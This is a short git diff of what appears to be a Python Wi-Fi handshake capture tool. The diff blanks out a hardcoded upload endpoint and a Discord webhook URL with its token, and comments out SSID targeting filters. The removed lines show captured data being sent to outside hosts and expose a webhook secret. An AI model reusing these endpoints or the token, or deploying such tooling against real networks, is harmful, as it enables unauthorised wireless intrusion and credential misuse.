@@ -23,10 +23,10 @@ from jsondiff import diff
 
 
 MON_IFACE = sys.argv[1]
-ENDPOINT = "https://morning-waterfall-52882.pktriot.net/send"
+ENDPOINT = "" # Change this
 networks = []
 stations = []
-WEBHOOK_URL = "https://discord.com/api/webhooks/1034503793330618418/_ITmMg5lx6UmHq79UCNJifm_Y9Y-PrfSJ8Zv9rM_LsNUAzEpxiZnUrF6XOq3Jn7cHRsa"
+WEBHOOK_URL = "" # Change this
 
 current_ap_mac = ""
 captured = False
@@ -344,15 +344,14 @@ def start():
         channel = net['channel']
         ssid = net['ssid']
 
-        # # Testing purpose
-        # if ap_mac!="54:37:bb:1f:4f:99":
+        # # Conditions for Testing purpose
+
+
+        # if "Teja Swaroop" in ssid:
         #     continue
 
-        if "Teja Swaroop" in ssid:
-            continue
-
-        if "Target Network" not in ssid:
-            continue
+        # if "Target Network" not in ssid:
+        #     continue
 
         if os.path.exists("captured_handshakes.json"):
             # Check if handshake is already captured
